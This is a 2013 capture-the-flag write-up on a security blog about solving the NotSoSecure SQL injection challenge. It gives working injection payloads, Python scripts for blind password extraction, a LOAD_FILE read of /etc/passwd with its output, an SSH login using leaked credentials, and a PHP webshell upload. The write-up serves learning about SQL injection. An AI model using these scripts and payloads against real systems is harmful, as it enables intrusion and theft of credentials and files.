@@ -1,0 +1,431 @@
+
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+    <title>NotSoSecure CTF Writeup</title>
+    <meta name="description" content="">
+
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <link rel="shortcut icon" href="/favicon.ico">
+
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.4.0/css/font-awesome.min.css">
+    <link rel="stylesheet" type="text/css" href="/assets/css/prism.css?v=bac5711c0a">
+    <link rel="stylesheet" type="text/css" href="/assets/css/screen.css?v=bac5711c0a">
+    <link rel="stylesheet" type="text/css" href="//fonts.googleapis.com/css?family=Merriweather:300,700,700italic,300italic%7COpen+Sans:700,400">
+
+    <link rel="canonical" href="http://www.spect.cl/blog/2013/10/notsosecure-ctf-writeup/">
+    <meta name="referrer" content="origin">
+    
+    <meta property="og:site_name" content="SPECT Research">
+    <meta property="og:type" content="article">
+    <meta property="og:title" content="NotSoSecure CTF Writeup">
+    <meta property="og:description" content="Last week it was the third edition of 8dot8 Security Conference, but as I'm currently in Europe I wasn't able to attend and the challenge they released was to extract some codes from an IPhone application, a difficult task for...">
+    <meta property="og:url" content="http://www.spect.cl/blog/2013/10/notsosecure-ctf-writeup/">
+    <meta property="article:published_time" content="2013-10-28T12:00:00.000Z">
+    <meta property="article:modified_time" content="2015-09-10T09:13:36.194Z">
+    <meta property="article:tag" content="ctf">
+    <meta property="article:tag" content="security">
+    
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:title" content="NotSoSecure CTF Writeup">
+    <meta name="twitter:description" content="Last week it was the third edition of 8dot8 Security Conference, but as I'm currently in Europe I wasn't able to attend and the challenge they released was to extract some codes from an IPhone application, a difficult task for...">
+    <meta name="twitter:url" content="http://www.spect.cl/blog/2013/10/notsosecure-ctf-writeup/">
+    
+    <script type="application/ld+json">
+{
+    "@context": "http://schema.org",
+    "@type": "Article",
+    "publisher": "SPECT Research",
+    "author": {
+        "@type": "Person",
+        "name": "Claudio Salazar",
+        "image": "//www.gravatar.com/avatar/134e22ab3b4cac1e783f88f84917bc12?s=250&d=mm&r=x",
+        "url": "http://www.spect.cl/author/claudio",
+        "sameAs": null,
+        "description": null
+    },
+    "headline": "NotSoSecure CTF Writeup",
+    "url": "http://www.spect.cl/blog/2013/10/notsosecure-ctf-writeup/",
+    "datePublished": "2013-10-28T12:00:00.000Z",
+    "dateModified": "2015-09-10T09:13:36.194Z",
+    "keywords": "ctf, security",
+    "description": "Last week it was the third edition of 8dot8 Security Conference, but as I&#x27;m currently in Europe I wasn&#x27;t able to attend and the challenge they released was to extract some codes from an IPhone application, a difficult task for..."
+}
+    </script>
+
+    <meta name="generator" content="Ghost 0.7">
+    <link rel="alternate" type="application/rss+xml" title="SPECT Research" href="http://www.spect.cl/rss/">
+    <script>
+var disqus_shortname = 'spectresearch';
+var ga_id = 'UA-18043187-1';
+</script>
+</head>
+
+<body><header class="main-header no-cover">
+    <div class="vertical">
+        <div class="main-header-content inner">
+            <h1 class="page-title">SPECT Research</h1>
+            <h2 class="page-description">Security and Software Development</h2>
+            <br>
+            <div>
+              <a class="spectnav" href="/"><i class="fa fa-home"></i> Home</a>
+              <a class="spectnav" href="/about/"><i class="fa fa-group"></i> About us</a>
+              <a class="spectnav" href="/projects/"><i class="fa fa-copy"></i> Projects</a>
+              <a class="spectnav" href="/education/"><i class="fa fa-book"></i> Education</a>
+            </div>
+            <div>
+              <a class="spectnav" href="http://github.com/spectresearch"><i class="spectnav fa fa-github"></i></a>
+              <a class="spectnav" href="http://twitter.com/spectresearch"><i class="spectnav fa fa-twitter"></i></a>
+            </div>
+        </div>
+    </div>
+    <a class="scroll-down icon-arrow-left" href="#content" data-offset="-45"><span class="hidden">Scroll Down</span></a>
+</header>
+
+
+
+    
+
+    <div class="site-wrapper">
+
+        
+
+
+<main class="content" role="main">
+    <article class="post tag-ctf tag-security">
+
+        <header class="post-header">
+            <h1 class="post-title">NotSoSecure CTF Writeup</h1>
+            <section class="post-meta">
+                <time class="post-date" datetime="2013-10-28">28 October 2013</time>  on <a href="/tag/ctf/">ctf</a>, <a href="/tag/security/">security</a>
+            </section>
+        </header>
+
+        <section class="post-content">
+            <p>Last week it was the third edition of <a href="http://www.8dot8.org">8dot8 Security Conference</a>, but as I'm currently in Europe I wasn't able to attend and the challenge they released was to extract some codes from an <em>IPhone</em> application, a difficult task for someone not having an <em>IPhone</em> device. I was a bit disappointed and therefore wanted to spend my time in another challenge. I was registered for <a href="http://notsosecure.com/">NotSoSecure</a> CTF, so participated managing to find the two flags (<a href="http://ctf.notsosecure.com/leaderboard/">final leaderboard</a>). This is my writeup about the challenge.</p>
+
+<h2 id="gettingthefirstflag">Getting the first flag</h2>
+
+<p>The challenge's frontpage was a normal login form asking for an unknown user/password.</p>
+
+<p><img src="http://cdn.spect.cl/blog/posts/images/ctf_notsosecure_login_form.png" style="height:400px; width:500px"></p>
+
+<p>Trying common <em>SQL</em> injection patterns didn't succeed and the browser didn't show any extra data. The flow in this situation was:</p>
+
+<ul>
+<li>Fill the form</li>
+<li>Submit the form to /checklogin.php</li>
+<li>Redirect to /error.php</li>
+</ul>
+
+<p>I was a while looking at the code for any hint but nothing. Then I run <em>BurpSuite</em> to execute some requests and realized that there's some data in the redirect response. That kind of information wasn't visible in the browser, so to take in account next time.</p>
+
+<p>The data was the following:</p>
+
+<p><code>7365637265745f72656769737465722e68746d6c</code></p>
+
+<p>After decoding that string I got <code>secret_register.html</code>.</p>
+
+<p><img src="http://cdn.spect.cl/blog/posts/images/ctf_notsosecure_register_form.png" style="height:400px; width:500px"></p>
+
+<p>The registration form allowed to create a new valid user to use in the first login form. You had to provide an username, e-mail and password. After creating a new user, you had to login using the first form and the following image was displayed.</p>
+
+<p><img src="http://cdn.spect.cl/blog/posts/images/ctf_notsosecure_not_admin_login.png" style="height:300px; width:500px"></p>
+
+<p>Looking at the response, a <code>session_id</code> cookie was created with an obfuscated value. It contained the string <code>%3D</code> (the <em>URL</em>-encoding for <code>=</code>) so it seemed like a <em>base64</em> string. The encoded value corresponded to the user email. Based on that, I thought there was a query like <code>SELECT email FROM users where username='myuser'</code> so I tried a simple SQL injection in the parameter <code>regname</code> like <code>1' OR '1'='1';--</code> which returned to me the admin email: <code>admin@sqlilabs.com</code>.</p>
+
+<p>All the time I was using this script to help me to only worry about <em>SQL</em> injection payloads.</p>
+
+<pre><code class="language- language-python line-numbers">import re  
+import requests  
+import sys  
+import base64
+
+from urllib import unquote
+
+headers = {'User-Agent': 'Mozilla 5.0'}
+
+payload = sys.argv[1]  
+reg_url = "http://ctf.notsosecure.com/71367217217126217712/register.php?" \  
+    "regname=%s&amp;regemail=email@example.org&amp;regpass1=test&amp;regpass2=test"
+
+r = requests.get(reg_url % payload, headers=headers)
+
+login_url = "http://ctf.notsosecure.com/71367217217126217712/checklogin.php"  
+data = {'myusername': payload, 'mypassword': 'test'}
+
+r = requests.post(login_url, data=data, headers=headers)  
+try:  
+    session_id = r.cookies['session_id']
+    print "Text: %s " % base64.b64decode(unquote(session_id))
+except:  
+    print "[-] Failed!"
+
+if re.findall('Attack detected', r.content):  
+    print "[-] Attack detected"
+elif not re.findall("You are not Admin!", r.content):  
+    print 'Check page!'
+</code></pre>
+
+<p>With that in mind, I started to think how to get the password. I was a bit tired and that's why I took the longest way to get the password, not seeing the short and easy way. I tried a SQL injection like <code>admin' and password='x%'</code> (x = char). Obviously it wasn't a manual search since I programmed a script to optimize the number of sent requests and extract the password. <br>
+The script was the following.</p>
+
+<pre><code class="language- language-python line-numbers">import requests  
+import sys  
+import base64
+
+from urllib import unquote
+
+base_url = "http://ctf.notsosecure.com/71367217217126217712"  
+login_url = base_url + "/checklogin.php"  
+reg_url = base_url + "/register.php?regname=%s&amp;regemail=e@example.org&amp;regpass1=test&amp;regpass2=test"  
+headers = {'User-Agent': 'Mozilla 5.0'}
+
+def is_valid_payload(payload):  
+    #Register user
+    requests.get(reg_url % payload, headers=headers)
+
+    #Login with created user
+    data = {'myusername': payload, 'mypassword': 'test'}
+    r = requests.post(login_url, data=data, headers=headers)
+    try:
+        session_id = r.cookies['session_id']
+        email = base64.b64decode(unquote(session_id))
+        if email == 'admin@sqlilabs.com':
+            return True
+    except:
+        pass
+
+    return False
+
+def got_password(flag):  
+    if not flag:
+        return False
+
+    payload = "admin' and password='%s';--" % flag
+    if is_valid_payload(payload):
+        return True
+    else:
+        return False
+
+def guess_next_letter(flag, chars):  
+    payload = "admin' and password like '{0}%';--"
+
+    for c in chars:
+        new_payload = payload.format(flag + c)
+        if is_valid_payload(new_payload):
+            return c
+
+    print '[-] Letter not found.'
+    sys.exit(0)
+
+def get_valid_chars():  
+    chars = []
+    payload = "admin' and password like '%{0}%';--"
+
+    print 'Recollecting chars ...'
+
+    for i in range(32, 126):
+        c = chr(i)
+        if c == '%':
+            continue
+
+        new_payload = payload.format(c)
+        if is_valid_payload(new_payload):
+            print 'Added char %s' % c
+            chars.append(c)
+
+    print "chars = %s" % repr(chars)
+    return chars
+
+if __name__ == '__main__':  
+    flag = ''
+    chars = get_valid_chars()
+
+    print 'Starting bruteforce ...'
+    while not got_password(flag):
+        flag += guess_next_letter(flag, chars)
+        print "Guessed letters: %s" % flag
+
+    print 'Flag: %s' % flag
+</code></pre>
+
+<p>Getting this output:</p>
+
+<pre><code class="language- language-bash">$ python phase1.py
+Starting bruteforce ...  
+Guessed letters: S  
+Guessed letters: SQ  
+Guessed letters: SQL  
+Guessed letters: SQLI  
+Guessed letters: SQLIL  
+Guessed letters: SQLILA  
+Guessed letters: SQLILAB  
+Guessed letters: SQLILABR  
+Guessed letters: SQLILABRO  
+Guessed letters: SQLILABROC  
+Guessed letters: SQLILABROCK  
+Guessed letters: SQLILABROCKS  
+Guessed letters: SQLILABROCKS!  
+Guessed letters: SQLILABROCKS!!  
+Flag: SQLILABROCKS!!%  
+</code></pre>
+
+<p>Next day, I tested with:</p>
+
+<pre><code class="language- language-bash">$ python phase2.py "admin' UNION SELECT password, '1' FROM users where name='admin' LIMIT 1,1--"
+Text: sqlilabRocKs!!  
+</code></pre>
+
+<p>Getting the same password more easily. Login with admin as username and that password, the first flag was displayed.</p>
+
+<p><img src="http://cdn.spect.cl/blog/posts/images/ctf_notsosecure_admin_login.png" style="height:200px; width:700px"></p>
+
+<h2 id="gettingthesecondflag">Getting the second flag</h2>
+
+<p>To get the second flag I had to read a  <code>secret.txt</code> file. After confirming that it was a <em>MySQL</em> database, I tested if I had permission to read/write files trying to read <code>/etc/passwd</code> file.</p>
+
+<pre><code class="language- language-bash line-numbers">$ python phase2.py "admin' UNION SELECT LOAD_FILE('/etc/passwd'), '1' FROM users LIMIT 1,1--"
+Text: root:x:0:0:root:/root:/bin/bash  
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh  
+bin:x:2:2:bin:/bin:/bin/sh  
+sys:x:3:3:sys:/dev:/bin/sh  
+sync:x:4:65534:sync:/bin:/bin/sync  
+games:x:5:60:games:/usr/games:/bin/sh  
+man:x:6:12:man:/var/cache/man:/bin/sh  
+lp:x:7:7:lp:/var/spool/lpd:/bin/sh  
+mail:x:8:8:mail:/var/mail:/bin/sh  
+news:x:9:9:news:/var/spool/news:/bin/sh  
+uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh  
+proxy:x:13:13:proxy:/bin:/bin/sh  
+www-data:x:33:33:www-data:/var/www:/bin/sh  
+backup:x:34:34:backup:/var/backups:/bin/sh  
+list:x:38:38:Mailing List Manager:/var/list:/bin/sh  
+irc:x:39:39:ircd:/var/run/ircd:/bin/sh  
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh  
+nobody:x:65534:65534:nobody:/nonexistent:/bin/sh  
+libuuid:x:100:101::/var/lib/libuuid:/bin/sh  
+syslog:x:101:103::/home/syslog:/bin/false  
+mysql:x:102:105:MySQL Server,,,:/nonexistent:/bin/false  
+messagebus:x:103:106::/var/run/dbus:/bin/false  
+whoopsie:x:104:107::/nonexistent:/bin/false  
+landscape:x:105:110::/var/lib/landscape:/bin/false  
+sshd:x:106:65534::/var/run/sshd:/usr/sbin/nologin  
+postgres:x:107:112:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash  
+ctf:x:1000:1000:,,,:/home/ctf:/bin/bash  
+temp123:x:1001:1001:weakpassword1:/home/temp123:/bin/sh  
+ntop:x:108:116::/var/lib/ntop:/bin/false  
+</code></pre>
+
+<p>The line 29 shows a strange user, so I tried to log in SSH using <code>temp123:weakpassword1</code> getting a shell. I did a listing and saw <code>public_html</code> directory, so I could create scripts running under the user configured in Apache (well, that's the default behaviour). At that point, I had to find where <code>secret.txt</code> was.</p>
+
+<pre><code class="language- language-bash">$ locate secret.txt
+/secret.txt
+$ ls -l /secret.txt
+-r--------   1 www-data www-data   684 Oct 25 07:46 secret.txt
+</code></pre>
+
+<p>I uploaded a simple <em>PHP</em> webshell, tested that I was running the shell as 'www-data' and finally issued the command <code>cat /secret.txt</code> from the webshell, getting the second flag.</p>
+
+<h2 id="conclusions">Conclusions</h2>
+
+<p>It was a very nice CTF, there are many good writeups of other people in Internet if you want to learn other techniques/tools to exploit this kind of vulnerabilities. Since these challenges belong to the <a href="http://www.securitytube-training.com/virtual-labs/sql-injection-labs/index.html">SQL Injection Labs</a>, I think that lab is highly recommendable for anyone who wants to understand in depth SQL injection.</p>
+
+<p>I'm waiting for the next NotSoSecure CTF in December.</p>
+        </section>
+
+        <footer class="post-footer">
+
+
+            <figure class="author-image">
+                <a class="img" href="/author/claudio/" style="background-image: url(//www.gravatar.com/avatar/134e22ab3b4cac1e783f88f84917bc12?s=250&amp;d=mm&amp;r=x)"><span class="hidden">Claudio Salazar's Picture</span></a>
+            </figure>
+
+            <section class="author">
+                <h4><a href="/author/claudio/">Claudio Salazar</a></h4>
+
+                    <p>Read <a href="/author/claudio/">more posts</a> by this author.</p>
+                <div class="author-meta">
+                    
+                    
+                </div>
+            </section>
+
+
+            <section class="share">
+                <h4>Share this post</h4>
+                <a class="icon-twitter" href="https://twitter.com/share?text=NotSoSecure%20CTF%20Writeup&amp;url=http://www.spect.cl/blog/2013/10/notsosecure-ctf-writeup/" onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+                    <span class="hidden">Twitter</span>
+                </a>
+                <a class="icon-facebook" href="https://www.facebook.com/sharer/sharer.php?u=http://www.spect.cl/blog/2013/10/notsosecure-ctf-writeup/" onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+                    <span class="hidden">Facebook</span>
+                </a>
+                <a class="icon-google-plus" href="https://plus.google.com/share?url=http://www.spect.cl/blog/2013/10/notsosecure-ctf-writeup/" onclick="window.open(this.href, 'google-plus-share', 'width=490,height=530');return false;">
+                    <span class="hidden">Google+</span>
+                </a>
+            </section>
+
+        <footer class="post comments">
+  <div id="disqus_thread"></div>
+  <script type="text/javascript">
+  (function() {
+  var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+  dsq.src = '//' + window.disqus_shortname + '.disqus.com/embed.js';
+  (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+  })();
+  </script>
+  <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+  <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</footer>
+
+        </footer>
+
+    </article>
+</main>
+
+<aside class="read-next">
+    <a class="read-next-story no-cover" href="/blog/2014/04/notsosecure-ctf2-writeup/">
+        <section class="post">
+            <h2>NotSoSecure CTF2 Writeup</h2>
+            <p>Since for the first NotSoSecure CTF I had a lot of fun, I joined again for the new version.…</p>
+        </section>
+    </a>
+    <a class="read-next-story prev no-cover" href="/blog/2013/03/our-first-university-course/">
+        <section class="post">
+            <h2>Our first university course</h2>
+            <p>Today is a great day, I (Claudio Salazar) can officially confirm that this semester I'm going to teach a…</p>
+        </section>
+    </a>
+</aside>
+
+
+
+        <footer class="site-footer clearfix">
+            <section class="copyright"><a href="http://www.spect.cl">SPECT Research</a> © 2015</section>
+        </footer>
+
+    </div>
+
+    <!-- You can safely delete this line if your theme does not require jQuery -->
+<script type="text/javascript" src="https://code.jquery.com/jquery-1.11.3.min.js"></script>
+    <script>
+  if (window.ga_id) {
+    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+    })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+    ga('create', window.ga_id, 'auto');
+    ga('require', 'linkid', 'linkid.js');
+    ga('send', 'pageview');
+  }
+</script>
+
+    <script type="text/javascript" src="/assets/js/prism.js?v=bac5711c0a"></script>
+    <script type="text/javascript" src="/assets/js/jquery.fitvids.js?v=bac5711c0a"></script>
+    <script type="text/javascript" src="/assets/js/index.js?v=bac5711c0a"></script>
+
+
+</body>
